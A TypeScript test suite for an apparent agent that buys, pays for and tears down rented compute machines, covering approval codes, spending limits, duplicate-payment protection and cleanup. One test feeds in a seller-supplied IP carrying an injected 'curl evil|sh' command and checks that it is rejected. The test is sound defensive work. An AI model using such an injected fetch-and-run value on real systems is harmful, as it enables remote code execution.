import { execFileSync } from "node:child_process";
import { createPrivateKey, createPublicKey, sign, verify } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it, vi } from "vitest";
import { NETWORKS } from "./guard";
import { Journal } from "./journal";
import { MarketRun, type MarketRunDeps, type PurchaseRecord } from "./run";
import { SELLERS, SellerClient, type SellerConfig } from "./seller";
import { newSshKey } from "./sshkey";
import { FakeProcessor, fakePayer, inProcess } from "./testing";
import { NO_FAULTS, TestSeller, type Faults } from "./testseller";
import type { Limits, MarketId, Need, Offer } from "./types";

const T0 = 1_700_000_000_000;
const NEED: Need = { kind: "cpu", vcpus: 1, ramGb: 1, vramGb: 0, hours: 1, regions: [], allowSpot: false };
const LIMITS: Limits = { budgetUsd: 1, rateUsdHr: 1 };
/** vc2-1c-1gb for 1 hour: 0.009027 x 1.15, rounded up to the next atomic unit */
const CHEAPEST_USD = 0.010382;

const dirs: string[] = [];
const payers: { calls: number }[] = [];
const processors: FakeProcessor[] = [];

afterEach(() => {
  vi.useRealTimers();
  // Invariant across every case in this file: never more than one signed payment, never more than one settle.
  for (const p of payers) expect(p.calls).toBeLessThanOrEqual(1);
  for (const p of processors) expect(p.settled).toBeLessThanOrEqual(1);
  payers.length = 0;
  processors.length = 0;
  for (const d of dirs.splice(0)) fs.rmSync(d, { recursive: true, force: true });
});

type Setup = {
  market?: MarketId;
  ask?: boolean;
  need?: Partial<Need>;
  limits?: Partial<Limits>;
  faults?: Partial<Faults>;
  noPayer?: boolean;
  wrap?: (f: typeof fetch) => typeof fetch;
  spotFeed?: () => Promise<Offer[]>;
  probePort?: (ip: string) => Promise<boolean>;
  activeAfterSec?: number;
};

function setup(o: Setup = {}) {
  let t = T0;
  const now = () => t;
  const sleep = async (ms: number) => {
    t += ms;
  };
  const market = o.market ?? "test";
  const processor = new FakeProcessor(market === "real" ? { network: NETWORKS.real.caip2, asset: NETWORKS.real.usdc } : {});
  processors.push(processor);
  const config: SellerConfig = market === "real" ? { ...SELLERS.test, market: "real" } : SELLERS.test;
  const seller = new TestSeller({ processor, resourceUrl: `${config.baseUrl}/compute/provision`, now, activeAfterSec: o.activeAfterSec });
  seller.faults = { ...NO_FAULTS, ...o.faults };
  const payer = fakePayer();
  payers.push(payer);
  const base = inProcess(seller);
  const client = new SellerClient(config, { fetch: o.wrap ? o.wrap(base) : base, signer: payer.signer, now, sleep });
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "market-run-"));
  dirs.push(dir);
  const journal = new Journal(path.join(dir, "purchases.jsonl"));
  const records: PurchaseRecord[] = [];
  let codes = 0;
  const deps: MarketRunDeps = {
    id: "run-1",
    market,
    seller: client,
    spotFeed: o.spotFeed,
    payer: o.noPayer ? null : payer,
    journal,
    need: { ...NEED, ...o.need },
    limits: { ...LIMITS, ...o.limits },
    askBeforePaying: o.ask ?? false,
    agent: { name: "Buyer", ansName: "buyer.agents.test" },
    keyDir: path.join(dir, "keys"),
    now,
    sleep,
    newCode: () => `code-${++codes}`,
    onRecord: (r) => records.push(r),
    probePort: o.probePort,
  };
  const run = new MarketRun(deps);
  const events = () => journal.all().map((e) => e.event);
  return { run, seller, processor, payer, journal, records, events, now, advance: (ms: number) => (t += ms), dir };
}

/** A seller that never sees max_total_usd, so only the run's own guard stands in the way. */
const ignoresMaxTotal = (f: typeof fetch) =>
  (async (input: RequestInfo | URL, init?: RequestInit) => {
    if (typeof init?.body === "string" && init.body.includes("max_total_usd")) {
      const { max_total_usd, ...rest } = JSON.parse(init.body);
      void max_total_usd;
      return f(input, { ...init, body: JSON.stringify(rest) });
    }
    return f(input, init);
  }) as typeof fetch;

const waitPhase = (run: MarketRun, phase: string) => vi.waitFor(() => expect(run.view().phase).toBe(phase));

describe("newSshKey", () => {
  it("writes an OpenSSH ed25519 key with mode 0o600 and returns only the public line and path", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "market-key-"));
    dirs.push(dir);
    const { publicKey, privatePath } = newSshKey(path.join(dir, "keys"), "run-1");
    expect(publicKey).toMatch(/^ssh-ed25519 AAAAC3NzaC1lZDI1NTE5[A-Za-z0-9+/=]+ agent-rental$/);
    expect(path.isAbsolute(privatePath)).toBe(true);
    expect(fs.statSync(privatePath).mode & 0o777).toBe(0o600);
    const pem = fs.readFileSync(privatePath, "utf8");
    expect(pem.startsWith("-----BEGIN OPENSSH PRIVATE KEY-----\n")).toBe(true);
    expect(fs.readFileSync(`${privatePath}.pub`, "utf8").trim()).toBe(publicKey);

    // the private half really belongs to the public line
    const body = Buffer.from(pem.split("\n").slice(1, -2).join(""), "base64");
    expect(body.subarray(0, 15).toString("binary")).toBe("openssh-key-v1\0");
    const blob = Buffer.from(publicKey.split(" ")[1], "base64");
    const pub = blob.subarray(blob.length - 32);
    const seedAt = body.indexOf(Buffer.concat([Buffer.from([0, 0, 0, 64])]), body.indexOf(pub) + 32);
    const seed = body.subarray(seedAt + 4, seedAt + 36);
    const key = createPrivateKey({ key: Buffer.concat([Buffer.from("302e020100300506032b657004220420", "hex"), seed]), format: "der", type: "pkcs8" });
    const pubKey = createPublicKey({ key: Buffer.concat([Buffer.from("302a300506032b6570032100", "hex"), pub]), format: "der", type: "spki" });
    expect(verify(null, Buffer.from("x"), pubKey, sign(null, Buffer.from("x"), key))).toBe(true);

    expect(() => newSshKey(path.join(dir, "keys"), "run-1")).toThrow(); // never overwrites
    expect(() => newSshKey(dir, "../escape")).toThrow();
  });

  it.skipIf(!fs.existsSync("/usr/bin/ssh-keygen"))("is accepted by ssh-keygen", () => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "market-key-"));
    dirs.push(dir);
    const { publicKey, privatePath } = newSshKey(dir, "k");
    expect(execFileSync("/usr/bin/ssh-keygen", ["-y", "-f", privatePath], { encoding: "utf8" }).trim()).toBe(publicKey);
  });
});

describe("MarketRun happy path", () => {
  it("test market, no approval: ends ready, pays the quote once, journals intent, paid, active", async () => {
    const { run, payer, events, records, processor, seller } = setup();
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(v.payment?.usd).toBe(CHEAPEST_USD);
    expect(v.payment?.tx).toBe("tx-1");
    expect(v.payment?.payer).toBe(payer.address);
    expect(events()).toEqual(["intent", "paid", "active"]);
    expect(records).toHaveLength(1);
    expect(records[0]).toMatchObject({ outcome: "accepted", plan: "vc2-1c-1gb", region: "ewr", usd: CHEAPEST_USD, tx: "tx-1" });
    const chosen = v.rows.filter((r) => r.state === "chosen");
    expect(chosen).toHaveLength(1);
    expect(chosen[0]).toMatchObject({ id: "vc2-1c-1gb", quoteUsd: CHEAPEST_USD, region: "ewr" });
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(1);
    expect(v.sources).toEqual([{ name: "Test seller (devnet, simulated machines)", ok: true, count: expect.any(Number), note: null }]);
    expect(v.machine).toMatchObject({ status: "active", port22: "not checked", plan: "vc2-1c-1gb", region: "ewr" });
    expect(v.machine?.ip).toMatch(/^203\.0\.113\./);
    expect(seller.machines.get(v.machine!.id)?.destroyed).toBe(false);
    expect(v.approval).toBeNull();
    expect(v.paidAt).not.toBeNull();
    expect(v.readyAt).not.toBeNull();
    expect(v.machine?.destroyAt).toBe(Math.min(v.paidAt! + 3600_000, v.machine!.expiresAt!));
  });

  it("view is JSON-safe, names the key only by path, and holds no private key", async () => {
    const { run } = setup();
    await run.start();
    const v = run.view();
    const text = JSON.stringify(v);
    expect(text).not.toMatch(/PRIVATE KEY/);
    const keyPath = /ssh -i (\S+) root@203\.0\.113\.\d+$/.exec(v.machine!.ssh!)![1];
    expect(fs.readFileSync(keyPath, "utf8")).toMatch(/OPENSSH PRIVATE KEY/);
    expect(fs.statSync(keyPath).mode & 0o777).toBe(0o600);
    expect(JSON.parse(text)).toEqual(v);
  });

  it("start() twice runs once", async () => {
    const { run, payer } = setup();
    await Promise.all([run.start(), run.start()]);
    expect(run.view().phase).toBe("ready");
    expect(payer.calls).toBe(1);
  });
});

describe("MarketRun approval", () => {
  it("rests at approval with a code; a wrong code is refused; the right one continues; a second approve is refused", async () => {
    const { run, payer, events } = setup({ ask: true });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("approval");
    expect(v.approval).toMatchObject({
      code: "code-1",
      usd: CHEAPEST_USD,
      atomic: "10382",
      token: "USDC",
      plan: "vc2-1c-1gb",
      region: "ewr",
      hours: 1,
      seller: "testseller",
      payTo: "Receiver11111111111111111111111111111111111",
    });
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);

    expect(run.approve("code-2")).toMatchObject({ ok: false });
    expect(run.approve("")).toMatchObject({ ok: false });
    expect(run.view().phase).toBe("approval");
    expect(payer.calls).toBe(0);

    expect(run.approve("code-1")).toEqual({ ok: true });
    expect(run.approve("code-1")).toMatchObject({ ok: false });
    await waitPhase(run, "ready");
    expect(run.approve("code-1")).toMatchObject({ ok: false });
    expect(payer.calls).toBe(1);
    expect(events()).toEqual(["intent", "paid", "active"]);
  });

  it("real market always stops for approval, even with askBeforePaying false", async () => {
    const { run, payer } = setup({ market: "real", ask: false });
    await run.start();
    expect(run.view().phase).toBe("approval");
    expect(run.view().approval?.network).toContain("mainnet");
    expect(payer.calls).toBe(0);
  });

  it("cancel at approval ends refused CANCELLED, no payment, no journal line", async () => {
    const { run, payer, events, records } = setup({ ask: true });
    expect(run.cancel()).toMatchObject({ ok: false }); // before start
    await run.start();
    expect(run.cancel()).toEqual({ ok: true });
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("CANCELLED");
    expect(run.approve("code-1")).toMatchObject({ ok: false });
    expect(run.cancel()).toMatchObject({ ok: false });
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("CANCELLED"), plan: "vc2-1c-1gb", region: "ewr" })]);
  });

  it("cancel at ready is refused", async () => {
    const { run } = setup();
    await run.start();
    expect(run.cancel()).toMatchObject({ ok: false });
    expect(run.view().phase).toBe("ready");
  });
});

describe("MarketRun refusals and failures", () => {
  it("nothing fits: refused NOTHING_FITS with counts, payer never called, no journal lines", async () => {
    const { run, payer, events, records } = setup({ need: { vcpus: 64 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("refused");
    expect(v.refusal?.code).toBe("NOTHING_FITS");
    expect(v.leftOut).toEqual(expect.arrayContaining([expect.objectContaining({ reason: "TOO_SMALL" })]));
    expect(v.rows.every((r) => r.state === "left out")).toBe(true);
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused" })]);
  });

  it("no payer: failed with the wallet message before any intent", async () => {
    const { run, events, records } = setup({ noPayer: true });
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("failed");
    expect(run.view().error).toContain("no wallet is set up for this market");
    expect(events()).toEqual([]);
    expect(records).toEqual([expect.objectContaining({ outcome: "failed" })]);
  });

  it("seller raises the price after quoting: refused OVER_QUOTE, payer never called, journal intent, failed", async () => {
    const { run, payer, events, records, processor } = setup({ faults: { quoteBumpPct: 20 } });
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("OVER_QUOTE");
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
    expect(events()).toEqual(["intent", "failed"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("OVER_QUOTE") })]);
  });

  it("seller asks for another token: quotes fail WRONG_ASSET, and with all wrong the run fails", async () => {
    const { run, payer, events } = setup({ faults: { wrongAsset: true } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    const failed = v.rows.filter((r) => r.state === "quote failed");
    expect(failed.length).toBeGreaterThan(0);
    expect(failed[0].note).toContain("WRONG_ASSET");
    expect(v.attempts.filter((a) => !a.ok)).toHaveLength(8); // gives up after 8 failed quotes
    expect(v.error).toContain("WRONG_ASSET");
    expect(payer.calls).toBe(0);
    expect(events()).toEqual([]);
  });

  it("over budget at quote time: the seller's max_total_usd check answers PRICE_CAP and nothing is chosen", async () => {
    // between the chooser's estimate (0.01038105) and the seller's rounded-up quote (0.010382)
    const { run, payer } = setup({ limits: { budgetUsd: 0.0103815 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.rows.find((r) => r.id === "vc2-1c-1gb")).toMatchObject({ state: "quote failed", note: expect.stringContaining("PRICE_CAP") });
    expect(v.rows.some((r) => r.state === "chosen")).toBe(false);
    expect(payer.calls).toBe(0);
  });

  it("over budget at quote time with a seller that ignores max_total_usd: the guard fails it OVER_BUDGET", async () => {
    const { run, payer } = setup({ limits: { budgetUsd: 0.0103815 }, wrap: ignoresMaxTotal });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.rows.find((r) => r.id === "vc2-1c-1gb")).toMatchObject({ state: "quote failed", note: expect.stringContaining("OVER_BUDGET") });
    expect(v.rows.some((r) => r.state === "chosen")).toBe(false);
    expect(payer.calls).toBe(0);
  });

  it("over the hourly limit at quote time: the quote fails OVER_RATE and is not chosen", async () => {
    const { run, payer } = setup({ limits: { rateUsdHr: 0.0103815 } });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.rows.find((r) => r.id === "vc2-1c-1gb")).toMatchObject({ state: "quote failed", note: expect.stringContaining("OVER_RATE") });
    expect(payer.calls).toBe(0);
  });

  it("both sources failing ends failed", async () => {
    const { run } = setup({
      wrap: () => (async () => new Response("down", { status: 500 })) as typeof fetch,
      spotFeed: async () => {
        throw new Error("spot feed down");
      },
    });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.sources).toEqual([
      expect.objectContaining({ ok: false, count: 0, note: expect.stringContaining("500") }),
      expect.objectContaining({ ok: false, count: 0, note: "spot feed down" }),
    ]);
  });

  it("a failed spot feed is reported and does not stop the run", async () => {
    const { run } = setup({
      spotFeed: async () => {
        throw new Error("spot feed down");
      },
    });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(run.view().sources.map((s) => s.ok)).toEqual([true, false]);
  });
});

describe("MarketRun fallback", () => {
  it("an out-of-stock region at quote time falls back to the next region", async () => {
    const { run } = setup({ faults: { outOfStockRegions: ["ewr"] } });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(v.machine).toMatchObject({ plan: "vc2-1c-1gb", region: "ord" });
    expect(v.attempts[0]).toMatchObject({ plan: "vc2-1c-1gb", region: "ewr", ok: false });
  });

  it("all regions out at quote time falls back to the next plan", async () => {
    const { run } = setup({ faults: { outOfStockRegions: ["ewr", "ord", "dfw", "sea"] } });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(run.view().machine?.plan).toBe("do:s-1vcpu-1gb");
  });

  it("out of stock at pay time falls back to the next region with a new approval stop", async () => {
    const { run, seller, events, payer } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
    expect(run.approve("code-1")).toEqual({ ok: true });
    await waitPhase(run, "approval");
    expect(run.view().approval).toMatchObject({ code: "code-2", plan: "vc2-1c-1gb", region: "ord" });
    expect(run.approve("code-1")).toMatchObject({ ok: false }); // the old code is spent
    expect(run.approve("code-2")).toEqual({ ok: true });
    await waitPhase(run, "ready");
    expect(run.view().machine?.region).toBe("ord");
    expect(events()).toEqual(["intent", "failed", "intent", "paid", "active"]);
    expect(payer.calls).toBe(1);
  });

  it("all regions out at pay time falls back to the next plan", async () => {
    const { run, seller, events, payer } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr", "ord", "dfw", "sea"] };
    for (let i = 1; run.view().phase === "approval" && i < 10; i++) {
      expect(run.approve(`code-${i}`)).toEqual({ ok: true });
      await vi.waitFor(() => expect(["approval", "ready", "failed", "refused"]).toContain(run.view().phase));
    }
    expect(run.view().phase).toBe("ready");
    expect(run.view().machine?.plan).toBe("do:s-1vcpu-1gb");
    expect(events()).toEqual(["intent", "failed", "intent", "failed", "intent", "paid", "active"]);
    expect(payer.calls).toBe(1);
  });
});

describe("MarketRun never pays twice", () => {
  it("503 once: one payer call, one settle, ready", async () => {
    const { run, payer, processor } = setup({ faults: { fail5xxOnce: true } });
    await run.start();
    expect(run.view().phase).toBe("ready");
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(1);
  });

  it("409 settlement_pending: adopts the machine from the instance list, one payer call", async () => {
    const { run, payer, events, seller } = setup({ faults: { settlementPending409: true } });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(payer.calls).toBe(1);
    expect(v.machine?.id).toBe([...seller.machines.keys()][0]);
    expect(events()).toEqual(["intent", "unknown", "paid", "active"]);
  });

  it("unknown and no machine appears: failed, one payer call, journal ends unknown", async () => {
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        const headers = new Headers(init?.headers);
        if (headers.has("PAYMENT-SIGNATURE")) return new Response("gateway timeout", { status: 504 });
        return f(input, init);
      }) as typeof fetch;
    const { run, payer, events, processor, records } = setup({ wrap });
    await run.start();
    await run.done;
    const v = run.view();
    expect(v.phase).toBe("failed");
    expect(v.error).toContain("payment outcome unknown; check the journal");
    expect(payer.calls).toBe(1);
    expect(processor.settled).toBe(0);
    expect(events()).toEqual(["intent", "unknown"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "failed" })]);
  });
});

/** Rewrites every instance's ip_address the seller sends back. */
const rewriteIp = (ip: string) => (f: typeof fetch) =>
  (async (input: RequestInfo | URL, init?: RequestInit) => {
    const r = await f(input, init);
    const url = String(input instanceof Request ? input.url : input);
    if (!/\/compute\/(instances|provision)/.test(url)) return r;
    const text = await r.text();
    let body: Record<string, unknown>;
    try {
      body = JSON.parse(text);
    } catch {
      return new Response(text, { status: r.status, headers: r.headers });
    }
    const fix = (m: unknown) => {
      if (m && typeof m === "object" && (m as { status?: string }).status === "active") (m as { ip_address: string }).ip_address = ip;
    };
    fix(body.instance);
    fix(body.order);
    if (Array.isArray(body.instances)) body.instances.forEach(fix);
    return new Response(JSON.stringify(body), { status: r.status, headers: r.headers });
  }) as typeof fetch;

describe("MarketRun seller-supplied IP", () => {
  for (const bad of ["1.2.3.4; curl evil|sh", "example.com"]) {
    it(`treats ${JSON.stringify(bad)} as no IP: never in the ssh line, never probed, times out`, async () => {
      const probePort = vi.fn(async () => true);
      const { run } = setup({ wrap: rewriteIp(bad), probePort });
      await run.start();
      await run.done;
      const v = run.view();
      expect(v.phase).toBe("failed");
      expect(v.error).toContain("did not become active");
      expect(v.machine).toMatchObject({ ip: null, ssh: null, status: "active" });
      expect(JSON.stringify(v)).not.toContain(bad);
      expect(probePort).not.toHaveBeenCalled();
      await run.destroy(); // clears the armed retry
      expect(run.view().phase).toBe("released");
    });
  }

  it("probes a valid routable IP and puts it in the ssh line", async () => {
    const probePort = vi.fn(async () => true);
    const { run } = setup({ wrap: rewriteIp("198.51.100.7"), probePort });
    await run.start();
    const v = run.view();
    expect(v.phase).toBe("ready");
    expect(probePort).toHaveBeenCalledWith("198.51.100.7");
    expect(v.machine).toMatchObject({ ip: "198.51.100.7", port22: "open" });
    expect(v.machine?.ssh).toMatch(/ root@198\.51\.100\.7$/);
  });
});

describe("MarketRun destroy", () => {
  it("destroy releases the machine and journals released; a second destroy is a no-op", async () => {
    const { run, seller, events } = setup();
    await run.start();
    const id = run.view().machine!.id;
    await run.destroy();
    await run.done;
    expect(run.view().phase).toBe("released");
    expect(run.view().releasedAt).not.toBeNull();
    expect(seller.machines.get(id)?.destroyed).toBe(true);
    expect(events()).toEqual(["intent", "paid", "active", "released"]);
    await run.destroy();
    expect(events()).toEqual(["intent", "paid", "active", "released"]);
  });

  it("a failed destroy keeps the machine visible and stays ready; a retry works", async () => {
    let failDelete = true;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (failDelete && init?.method === "DELETE") return new Response("nope", { status: 500 });
        return f(input, init);
      }) as typeof fetch;
    const { run, events } = setup({ wrap });
    await run.start();
    await run.destroy();
    expect(run.view().phase).toBe("ready");
    expect(run.view().machine).not.toBeNull();
    expect(run.view().error).toContain("500");
    failDelete = false;
    await run.destroy();
    expect(run.view().phase).toBe("released");
    expect(run.view().error).toBeNull();
    expect(events().at(-1)).toBe("released");
  });

  it("destroy asked for while the paid request is in flight destroys the machine as soon as it is known", async () => {
    let target: MarketRun | null = null;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (new Headers(init?.headers).has("PAYMENT-SIGNATURE")) {
          expect(target!.view().phase).toBe("paying");
          void target!.destroy();
        }
        return f(input, init);
      }) as typeof fetch;
    const { run, seller, events, records } = setup({ wrap });
    target = run;
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("released");
    expect([...seller.machines.values()].every((m) => m.destroyed)).toBe(true);
    expect(events()).toEqual(["intent", "paid", "released"]);
    expect(records).toEqual([expect.objectContaining({ outcome: "accepted" })]);
  });

  it("destroy at the approval stop behaves like cancel", async () => {
    const { run, events, payer, records } = setup({ ask: true });
    await run.start();
    await run.destroy();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("CANCELLED");
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", plan: "vc2-1c-1gb", region: "ewr" })]);
  });

  it("destroy after approve but before the intent stops the run with nothing paid", async () => {
    const { run, events, payer, records } = setup({ ask: true });
    await run.start();
    expect(run.approve("code-1")).toEqual({ ok: true });
    await run.destroy();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
    expect(records).toHaveLength(1);
  });

  it("destroy during a not-charged attempt stops the run instead of buying a fallback", async () => {
    const { run, seller, events, payer, records, processor } = setup({ ask: true });
    await run.start();
    seller.faults = { ...seller.faults, outOfStockRegions: ["ewr"] };
    let target: MarketRun | null = null;
    const handle = seller.handle.bind(seller);
    seller.handle = async (req: Request) => {
      // the fresh 402 for the approved quote: the owner presses destroy while it is in flight
      if (req.method === "POST" && !req.headers.has("PAYMENT-SIGNATURE") && target) void target.destroy();
      return handle(req);
    };
    expect(run.approve("code-1")).toEqual({ ok: true });
    target = run;
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().approval?.code).toBe("code-1"); // no new approval stop
    expect(events()).toEqual(["intent", "failed"]);
    expect(payer.calls).toBe(0);
    expect(processor.settled).toBe(0);
    expect(records).toEqual([expect.objectContaining({ outcome: "refused", reason: expect.stringContaining("STOPPED") })]);
  });

  it("destroy during scanning stops the run before any payment", async () => {
    const { run, events, payer, records } = setup();
    const started = run.start();
    await run.destroy();
    await started;
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().attempts).toEqual([]);
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
    expect(records).toHaveLength(1);
  });

  it("destroy during quoting stops the run before any payment", async () => {
    let target: MarketRun | null = null;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (init?.method === "POST" && target) {
          expect(target.view().phase).toBe("quoting");
          void target.destroy();
        }
        return f(input, init);
      }) as typeof fetch;
    const { run, events, payer } = setup({ wrap });
    target = run;
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("refused");
    expect(run.view().refusal?.code).toBe("STOPPED");
    expect(run.view().attempts.length).toBeLessThanOrEqual(1);
    expect(events()).toEqual([]);
    expect(payer.calls).toBe(0);
  });

  it("a failed destroy is retried every 60 s, at most 10 times, and never after it succeeds", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    let deletes = 0;
    let failUntil = Infinity;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (init?.method === "DELETE" && ++deletes <= failUntil) return new Response("nope", { status: 500 });
        return f(input, init);
      }) as typeof fetch;
    const { run } = setup({ wrap });
    await run.start();
    await run.destroy();
    expect(deletes).toBe(1);
    await vi.advanceTimersByTimeAsync(60_000);
    expect(deletes).toBe(2);
    await vi.advanceTimersByTimeAsync(20 * 60_000);
    expect(deletes).toBe(11); // the first try plus 10 retries
    expect(vi.getTimerCount()).toBe(0);
    expect(run.view().phase).toBe("ready");

    failUntil = 0;
    await run.destroy();
    expect(run.view().phase).toBe("released");
    expect(vi.getTimerCount()).toBe(0);
  });

  it("a retry that succeeds stops the retries", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    let deletes = 0;
    const wrap = (f: typeof fetch) =>
      (async (input: RequestInfo | URL, init?: RequestInit) => {
        if (init?.method === "DELETE" && ++deletes <= 2) return new Response("nope", { status: 500 });
        return f(input, init);
      }) as typeof fetch;
    const { run, events } = setup({ wrap });
    await run.start();
    await run.destroy();
    await vi.advanceTimersByTimeAsync(2 * 60_000);
    expect(run.view().phase).toBe("released");
    expect(vi.getTimerCount()).toBe(0);
    await vi.advanceTimersByTimeAsync(10 * 60_000);
    expect(deletes).toBe(3);
    expect(events().filter((e) => e === "released")).toHaveLength(1);
  });

  it("a provisioning timeout arms a destroy retry for the paid machine", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    const { run, seller, events } = setup({ activeAfterSec: 1e9 });
    await run.start();
    await run.done;
    expect(run.view().phase).toBe("failed");
    expect(run.view().error).toContain("did not become active");
    const id = run.view().machine!.id;
    expect(vi.getTimerCount()).toBe(1);
    await vi.advanceTimersByTimeAsync(60_000);
    expect(run.view().phase).toBe("released");
    expect(seller.machines.get(id)?.destroyed).toBe(true);
    expect(events()).toEqual(["intent", "paid", "released"]);
  });

  it("auto-destroy fires at destroyAt", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    const { run, seller, now, advance } = setup();
    await run.start();
    const { destroyAt, id } = run.view().machine!;
    const wait = destroyAt! - now();
    expect(wait).toBeGreaterThan(0);
    await vi.advanceTimersByTimeAsync(wait - 1000);
    expect(run.view().phase).toBe("ready");
    advance(wait);
    await vi.advanceTimersByTimeAsync(1000);
    await run.done;
    expect(run.view().phase).toBe("released");
    expect(seller.machines.get(id)?.destroyed).toBe(true);
  });

  it("the auto-destroy timer does not fire after destroy()", async () => {
    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
    const { run, events } = setup();
    await run.start();
    await run.destroy();
    expect(vi.getTimerCount()).toBe(0);
    expect(events().filter((e) => e === "released")).toHaveLength(1);
  });
});
